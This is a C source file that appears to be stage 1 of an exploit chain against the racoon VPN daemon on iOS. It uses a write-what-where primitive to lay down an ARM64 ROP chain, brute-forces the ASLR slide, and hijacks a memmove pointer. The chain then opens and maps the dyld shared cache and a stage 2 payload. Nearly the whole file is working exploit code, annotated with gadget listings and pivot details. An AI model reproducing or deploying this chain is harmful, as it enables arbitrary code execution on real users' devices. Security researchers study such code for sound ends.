#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "rop.h"
#include "racoon_www.h"
#include "stage1.h"

// get a good address for our rop chain
// we will use the max slide + the address of teh memmove pointer and put the stack behind it so that we don't smash it by acciedent when brute forcing
// because memmove is at the start of the data section we will start brute forcing with the max slide and then move downwards so placing the rop chain behind it is the right way to do it
// otherwise we might smash it by accident when brute forcing
// we need to pivot to this address using a string buffer (the address will be put as raw bytes into a string inside of the conf parser)
// the conf parser doesn't care about null bytes etc but it cares about quotes so we need an address that has no quote in it otherwise the conf parser will reject our config
uint64_t get_ropchain_addr(offset_struct_t * offsets) {
	uint64_t test = offsets->max_slide + offsets->memmove + 16;
	test += (test % 0x10); // align at 16 bytes (stack alignment) (otherwise sp will cause a fault because we are misalign leading to weird crashes)
	union converter {
		uint64_t addr;
		char buf[8];
	};
	union converter tmp;
	memset(&tmp.buf,0,sizeof(tmp.buf));
	tmp.addr = test;
	for (int i = 0; i < sizeof(tmp.buf);i++) {
		if (tmp.buf[i] == '"') {
			tmp.addr += 0x10; // we have to respect stack alignment
			i = 0;
		}
	}
	return tmp.addr;
}

void stage1(int fd, offset_struct_t * offsets) {

	// generate the rop chain (see func below this one)
	generate_stage1_rop_chain(offsets);

	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
	uint64_t ropchain_addr = get_ropchain_addr(offsets);
	LOG("Chain will be at: %llx",ropchain_addr);

	// write all the values which shouldn't be slid (we write them once at the beginning)
	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
	uint64_t curr_ropchain_addr = ropchain_addr;

	while (curr_gadget != NULL) {
		switch(curr_gadget->type) {
			case STATIC:
				www64(fd,offsets,curr_ropchain_addr, curr_gadget->value);
				break;
			case OFFSET:
				www64(fd,offsets,curr_ropchain_addr,ropchain_addr+curr_gadget->value);
				break;
			default:
				break;
		}
		curr_ropchain_addr += 8;
		curr_gadget = curr_gadget->next;
	}

	// now we will write all of them that need to be slide (code addresses) then perform a trigger and if we haven't got the write slide try again
	int iterations = (offsets->max_slide/offsets->slide_value); // calculate the number of iterations we need to perform this
	LOG("%d iterations",iterations);
	for (int i = iterations; i >= 0; i--) { // we start with the biggerst slide and then get smaller slides because the memmove ptr is at the front of the cache so we need to start from behind so that the address we write to is always mapped
		uint64_t slide = i*offsets->slide_value; // calc current slide

		// write gadgets
		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
		uint64_t curr_ropchain_addr = ropchain_addr;
		while (curr_gadget != NULL) {
			switch (curr_gadget->type) {
				case CODEADDR:
					www64(fd,offsets,curr_ropchain_addr,curr_gadget->value+slide);
					break;
				default:
					break;
			}
			curr_gadget = curr_gadget->next;
			curr_ropchain_addr += 8;
		}
		// we have to write and then trigger right afterwards otherwise racoon might call fread between the write and the trigger
		// to get a new chunk of data and then fread will use the corrupted memmove pointer
		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
		trigger_exec(fd,offsets->str_buff_offset, ropchain_addr);
	}
	
	// cleanup
	rop_gadget_t *  current = offsets->stage1_ropchain;
	while (current != NULL) {
		if (current->comment != NULL) {
			free(current->comment);
		}
		rop_gadget_t * next = current->next;
		free(current);
		current = next;
	}
}

void generate_stage1_rop_chain(offset_struct_t * offsets) {

	/*
	[1]:

	We start with nothing but rip control and x21 pointing to a string buffer (AAAAAAAA<address of our rop stack>)
	the pivot x21 gadget looks like this:
	(this comes from libLLVM)
	0x1990198fc      a80640f9       ldr x8, [x21, 8]    <= x8 = address of our rop stack
	0x199019900      090140f9       ldr x9, [x8]        <= x9 is the first value at our rop stack
	0x199019904      292940f9       ldr x9, [x9, 0x50]  <= x9 is loaded from x9->0x50 and this is used to jump (we need to put our next code pointer there)
	0x199019908      e30740f9       ldr x3, [sp, 8]     <= x3 comes from the stack so we don't know what it will contain
	0x19901990c      e20300aa       mov x2, x0          <= don't know what's in x0
	0x199019910      e00308aa       mov x0, x8          <= x0 will contain x8 so the address of our rop stack
	0x199019914      e10316aa       mov x1, x22         <= don't know what's in x22
	0x199019918      e40314aa       mov x4, x20         <= don't know what's in x20
	0x19901991c      e50313aa       mov x5, x19         <= don't know what's in x19
	0x199019920      20013fd6       blr x9              <= will branch to [x8]->0x50

	This means that the first value in our stack needs to point to a place where +0x50 the new func pointer will be found
	While trying to get this running on 11.4.1 we noticed that they switched to x22 for that gadget so we can't use it anymore.
	Luckly sparkey found another one which is basically doing that same but loading from x9, 0x38 instead of x9, 0x50.
	So we will account for that with a new variable in the offset struct.

	[2]:
	Next we jump to longjmp to pivot and get more control over our registers
	x0 will point to the top of the stack
	(this comes from libsystem_platform)
	__longjmp:
	   180a817dc	LDP     X19, X20, [X0,#0]	 // x19 will contain the same address as x9 and we don't really want to change that 0x08 of our stack will be loaded into x20
	   180a817e0	LDP     X21, X22, [X0,#16]	 // x21 = our stack 0x10 and x22 = our stack 0x18
	   180a817e4	LDP     X23, X24, [X0,#32]   // x23 = our stack 0x20 and x24 = our stack 0x28
	   180a817e8	LDP     X25, X26, [X0,#48]   // x25 = our stack 0x30 and x26 = our stack 0x38
	   180a817ec	LDP     X27, X28, [X0,#64]   // x27 = our stack 0x40 and x28 = our stack 0x48
	   180a817f0	LDP     X29, X30, [X0,#80]   // x29 = our stack 0x50 and x30 = our stack 0x58
	   180a817f4	LDP     X29, X2, [X0,#96]    // x29 = our stack 0x60 and x2  = our stack 0x68
	   180a817f8	LDP     D8, D9, [X0, #112]   // we can ignore those registers
	   180a817fc	LDP     D10, D11, [X0, #128] //
	   180a81800	LDP     D12, D13, [X0, #144] //
	   180a81804	LDP     D14, D15, [X0, #160] //
	   180a81808	ADD     X31, X2, #0    	     // we pivot using x2 which is loaded from
	   180a8180c	MOV     X0, X1         	     // x0 will now contain the contents of x1 we can't control atm
	   180a81810	CMP     X0, #0         	     // irrelvant
	   180a81814	B.NE    0x180a8181c
	   180a81818	ADD     X0, X0, #1
	   180a8181c    RET                          // pivoted

	   So basically we want to set 0x58 to our next gadget and 0x68 to the address of our new stack

	[3]:
	
	Siguza found this beautiful gadget using r2 and some mask tricks:
		0x1a0478c70      e40316aa       mov x4, x22
		0x1a0478c74      e50314aa       mov x5, x20
		0x1a0478c78      e60315aa       mov x6, x21
		0x1a0478c7c      e70313aa       mov x7, x19
		0x1a0478c80      e0031aaa       mov x0, x26
		0x1a0478c84      e10319aa       mov x1, x25
		0x1a0478c88      e20318aa       mov x2, x24
		0x1a0478c8c      e30317aa       mov x3, x23
		0x1a0478c90      60033fd6       blr x27                    ;[0]
		0x1a0478c94      fd7b47a9       ldp x29, x30, [sp, 0x70]
		0x1a0478c98      f44f46a9       ldp x20, x19, [sp, 0x60]
		0x1a0478c9c      f65745a9       ldp x22, x21, [sp, 0x50]
		0x1a0478ca0      f85f44a9       ldp x24, x23, [sp, 0x40]
		0x1a0478ca4      fa6743a9       ldp x26, x25, [sp, 0x30]
		0x1a0478ca8      fc6f42a9       ldp x28, x27, [sp, 0x20]
		0x1a0478cac      e923416d       ldp d9, d8, [sp, 0x10]
		0x1a0478cb0      ff030291       add sp, sp, 0x80
		0x1a0478cb4      c0035fd6       ret

		We will call open("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64", O_RDONLY);
		Path is stored at 0x2b0

		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY

	[4]:
		Now we have fully loaded gadgets again and we will just jump back to the gadget used in [3] but ofc with other args
		to call mmap(new_cache_addr,cache_text_seg_size,PROT_READ | PROT_EXEC,MAP_FILE | MAP_SHARED | MAP_FIXED,DYLD_CACHE_FD,0)
		
		This means that x26 has to be the new_cache_addr, x25 has to be the cache_text_seg_size, x24 has to be PROT_READ | PROT_EXEC, x23 has to be MAP_FILE | MAP_SHARED | MAP_FIXED, x22 DYLD_CACHE_FD and x21 0
		
	[5]:
		now the cache is mapped at a static address so we don't have to slid anything anymore, we still need to load stage 2 tho and that's what we are doing now
		this will call open("/private/etc/racoon/stg2", O_RDONLY);

	[6]:
		now we need to mmap it: mmap(stage2_base,stage2_size,PROT_READ|PROT_WRITE.MAP_FIXED|MAP_PRIVATE,STAGE2_FD,0);
	[7]:
		now x0 will contain the mmap return value so we can just call longjmp and let that load the buffer at the start of stage 2
	*/

	union path_union {
		char path[62];
		struct {
			uint64_t a;
			uint64_t b;
			uint64_t c;
			uint64_t d;
			uint64_t e;
			uint64_t f;
			uint64_t g;
			uint64_t h;
		}ints;
	};
	union path_union path;
	snprintf((char*)&path.path,62,"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64");
	
	// call to longjump to pivot the stack and a longjump buf
	ROP_SETUP(offsets->stage1_ropchain);
	ADD_OFFSET_GADGET(offsets->pivot_x21_x9_offset);	   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
	ADD_GADGET();										   // 0x08		[2] x20 [3] x5/sixth arg
	ADD_GADGET();										   // 0x10		[2] x21 [3] x6/seventh arg
	ADD_GADGET();										   // 0x18		[2] x22 [3] x4/fifth arg 
	ADD_GADGET();										   // 0x20		[2] x23 [3] x3/fourth arg
	ADD_GADGET();										   // 0x28		[2] x24 [3] x2/third arg
	ADD_STATIC_GADGET(O_RDONLY);						   // 0x30		[2] x25 [3] x1/second arg
	ADD_OFFSET_GADGET(0x2b0);							   // 0x38		[2] x26 [3] x0/first arg !!!! THIS IS POINTING TO THE PATH BELOW SO WATCH OUT WHEN YOU CHANGE ANYTHING INBETWEEN YOU NEED TO AJUST THE OFFSET !!!
	ADD_CODE_GADGET(offsets->open);						   // 0x40		[2] x27 [3] call gadget
	ADD_GADGET();										   // 0x48		[2] x28 
	ADD_CODE_GADGET(offsets->longjmp);					   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x58		[2] x30 (next gadget)
	ADD_GADGET();										   // 0x60		[2] x29
	ADD_OFFSET_GADGET(0xb0);							   // 0x68		[2] x2  (new stack)
	ADD_GADGET();										   // 0x70		[2] weird Dx registers
	ADD_GADGET();										   // 0x78		[2] weird Dx registers
	ADD_GADGET();										   // 0x80		[2] weird Dx registers
	ADD_GADGET();										   // 0x88		[2] weird Dx registers
	ADD_GADGET();										   // 0x90		[2] weird Dx registers
	ADD_GADGET();										   // 0x98		[2] weird Dx registers
	ADD_GADGET();										   // 0xa0		[2] weird Dx registers
	ADD_GADGET();										   // 0xa8		[2] weird Dx registers

	// now longjump pivoted here and after the call of open from the original longjump buf we can call mmap here to map the caceh at a static address
	ADD_GADGET();										   // 0xb0		[2] new stack top 
	ADD_GADGET();										   // 0xb8
	ADD_GADGET();										   // 0xc0		[3] d9
	ADD_GADGET();										   // 0xc8		[3] d8
	ADD_GADGET();										   // 0xd0		[3] x28           
	ADD_CODE_GADGET(offsets->mmap);						   // 0xd8		[3] x27 [4] call gadget
	ADD_STATIC_GADGET(offsets->new_cache_addr);			   // 0xe0		[3] x26 [4] x0/first arg
	ADD_STATIC_GADGET(offsets->cache_text_seg_size);	   // 0xe8		[3] x25 [4] x1/second arg
	ADD_STATIC_GADGET(PROT_READ | PROT_EXEC);			   // 0xf0		[3] x24 [4] x2/third arg
	ADD_STATIC_GADGET(MAP_FILE | MAP_SHARED | MAP_FIXED);  // 0xf8		[3] x23 [4] x3/fourth arg
	ADD_STATIC_GADGET(DYLD_CACHE_FD);					   // 0x100		[3] x22 [4] x4/fifth arg
	ADD_GADGET();										   // 0x108		[3] x21 [4] x6/seventh arg
	ADD_STATIC_GADGET(0);								   // 0x110		[3] x20 [4] x5/sixth arg
	ADD_GADGET();										   // 0x118		[3] x19 [4] x7/eighth arg
	ADD_GADGET();										   // 0x120		[3] x29
	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x128		[3] x30 (next gadget)

#define ADD_UNSLID_CODE_GADGET(code_addr) ADD_STATIC_GADGET(code_addr-0x180000000+offsets->new_cache_addr)
	// we can now use the stack cache for the other calls and now we will open stage 2 to get a file descriptor
	ADD_GADGET();										   // 0x130		[3] new stack top
	ADD_STATIC_GADGET(0x657461766972702f);	   			   // 0x138				(/private)
	ADD_STATIC_GADGET(0x6361722f6374652f);	   			   // 0x140		[4] d9  (/etc/rac) 
	ADD_STATIC_GADGET(0x326774732f6e6f6f);	   			   // 0x148		[4] d8  (oon/stg2)
	ADD_STATIC_GADGET(0x0);					   			   // 0x150		[4] x28
	ADD_UNSLID_CODE_GADGET(offsets->open);				   // 0x158		[4] x27 [5] call gadget
	ADD_OFFSET_GADGET(0x138);							   // 0x160		[4] x26 [5] x0/first arg
	ADD_STATIC_GADGET(O_RDONLY);						   // 0x168		[4] x25 [5] x1/second arg
	ADD_GADGET();										   // 0x170		[4] x24 [5] x2/third arg
	ADD_GADGET();										   // 0x178		[4] x23 [5] x3/fourth arg
	ADD_GADGET();										   // 0x180		[4] x22 [5] x4/fifth arg
	ADD_GADGET();										   // 0x188		[4] x21 [5] x6/seventh arg
	ADD_GADGET();										   // 0x190		[4] x20 [5] x5/sixth arg
	ADD_GADGET();										   // 0x198		[4] x19 [5] x7/eighth arg
	ADD_GADGET();										   // 0x1a0		[4] x29
	ADD_UNSLID_CODE_GADGET(offsets->BEAST_GADGET);		   // 0x1a8		[4] x30 (next gadget)
	
	// and then mmap stage 2
	ADD_GADGET();										   // 0x1b0		[4] new stack top 
	ADD_GADGET();										   // 0x1b8
	ADD_GADGET();										   // 0x1c0		[5] d9
	ADD_GADGET();										   // 0x1c8		[5] d8
	ADD_GADGET();										   // 0x1d0		[5] x28           
	ADD_UNSLID_CODE_GADGET(offsets->mmap);				   // 0x1d8		[5] x27 [6] call gadget
	ADD_STATIC_GADGET(offsets->stage2_base);			   // 0x1e0		[5] x26 [6] x0/first arg
	ADD_STATIC_GADGET(offsets->stage2_size);			   // 0x1e8		[5] x25 [6] x1/second arg
	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE);			   // 0x1f0		[5] x24 [6] x2/third arg
	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE);			   // 0x1f8		[5] x23 [6] x3/fourth arg
	ADD_STATIC_GADGET(STAGE2_FD);						   // 0x200		[5] x22 [6] x4/fifth arg
	ADD_GADGET();										   // 0x208		[5] x21 [6] x6/seventh arg
	ADD_STATIC_GADGET(0);								   // 0x210		[5] x20 [6] x5/sixth arg
	ADD_GADGET();										   // 0x218		[5] x19 [6] x7/eighth arg
	ADD_GADGET();										   // 0x220		[5] x29
	ADD_UNSLID_CODE_GADGET(offsets->BEAST_GADGET);		   // 0x228		[5] x30 (next gadget)

	// after that we just call longjump with x0 pointing to it (return from mmap) so that we can place a longjump buffer at the top of stage 2
	ADD_GADGET();										   // 0x230		[5] new stack top 
	ADD_GADGET();										   // 0x238
	ADD_GADGET();										   // 0x240		[6] d9
	ADD_GADGET();										   // 0x248		[6] d8
	ADD_GADGET();										   // 0x250		[6] x28
	ADD_GADGET();										   // 0x258		[6] x27
	ADD_GADGET();										   // 0x260		[6] x26
	ADD_GADGET();										   // 0x268		[6] x25
	ADD_GADGET();										   // 0x270		[6] x24
	ADD_GADGET();										   // 0x278		[6] x23
	ADD_GADGET();										   // 0x280		[6] x22
	ADD_GADGET();										   // 0x288		[6] x21
	ADD_GADGET();										   // 0x290		[6] x20
	ADD_GADGET();										   // 0x298		[6] x19
	ADD_GADGET();										   // 0x2a0		[6] x29
	ADD_UNSLID_CODE_GADGET(offsets->longjmp);			   // 0x2a8		[6] x30 (next gadget)

	// this is the cache string here
	ADD_STATIC_GADGET(path.ints.a);						   // 0x2b0
	ADD_STATIC_GADGET(path.ints.b);						   // 0x2b8
	ADD_STATIC_GADGET(path.ints.c);						   // 0x2c0
	ADD_STATIC_GADGET(path.ints.d);						   // 0x2c8
	ADD_STATIC_GADGET(path.ints.e);						   // 0x2d0
	ADD_STATIC_GADGET(path.ints.f);						   // 0x2d8
	ADD_STATIC_GADGET(path.ints.g);						   // 0x2e0
	ADD_STATIC_GADGET(path.ints.h);						   // 0x2e8

}
